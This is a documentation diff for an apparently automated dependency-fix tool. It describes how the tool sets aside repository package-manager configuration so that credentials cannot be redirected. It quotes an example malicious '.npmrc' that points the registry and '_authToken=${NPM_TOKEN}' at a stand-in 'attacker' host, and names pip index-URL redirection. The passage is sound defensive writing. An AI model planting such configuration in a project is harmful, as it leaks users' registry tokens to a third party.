@@ -254,6 +254,39 @@ their respective projects.
   was started with reaches it. It is still the repository's code, running as
   you, with your files: run `create_fix_pr` only on a repository whose tests
   you would run yourself.
+- **A repository never chooses where `create_fix_pr`'s package managers send
+  your credentials.** A repository `.npmrc` with `registry=https://attacker/`
+  and `//attacker/:_authToken=${NPM_TOKEN}` made `npm outdated`, `npm ci`,
+  `npm install` and `npm audit` in its checkouts fetch from that host with
+  your own token (`--ignore-scripts` does not stop a fetch); a scoped
+  registry (`@acme:registry=…`) is the same route, and a requirements file's
+  `--index-url` makes `pip-audit` install from — and build sdists fetched
+  from — the repository's index. In every checkout `create_fix_pr` works in
+  (the planning tree, the fix's worktree, the base-commit tree), the
+  repository's own `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`,
+  `pip.conf`, `pip.ini`, `.pip/`, `.cargo/config.toml` / `.cargo/config`,
+  `.bundle/config` and `NuGet.config` — in the project's directory and every
+  directory above it in the checkout — are moved out before any package
+  manager runs, named in the group's `package_config_set_aside`, and put back
+  before anything is committed. Every package-manager process it runs, itself
+  or through `deps_update_plan` and `deps_audit` (`npm`, `pip-audit`,
+  `composer`, `bundle`, `cargo`, `go`, `dotnet restore`), gets the test
+  command's allowlisted environment plus your own package-manager
+  configuration: the `NPM_CONFIG_*`, `YARN_*`, `PIP_*`, `COMPOSER_*`,
+  `CARGO_REGISTRIES_*`, `BUNDLE_*`, `NUGET_*`, `GOPROXY`-family and proxy
+  variables, and exactly the variables your own `~/.npmrc` (or the file
+  `NPM_CONFIG_USERCONFIG` names), `~/.yarnrc` and `~/.yarnrc.yml` reference
+  as `${VAR}` — so a token you configured for your own registry still
+  reaches it, and only it. A fix whose requirements (or a file they include
+  with `-r` / `-c`) set `-i`, `--index-url`, `--extra-index-url`,
+  `--find-links` or `--trusted-host` is refused when it would install from
+  them — a pip step, or any re-scan by `deps_audit` — and so is a Composer
+  fix whose `composer.json` declares `repositories` (the manifest the fix
+  edits cannot be set aside); the planner does not plan Composer there
+  either. Not covered: a lockfile's own `resolved` URLs (npm sends a token
+  only to the host it was configured for), a direct-URL or VCS requirement,
+  and the scans a user runs outside `create_fix_pr`, which keep their
+  environment and the repository's configuration.
 
 ## Network egress
 
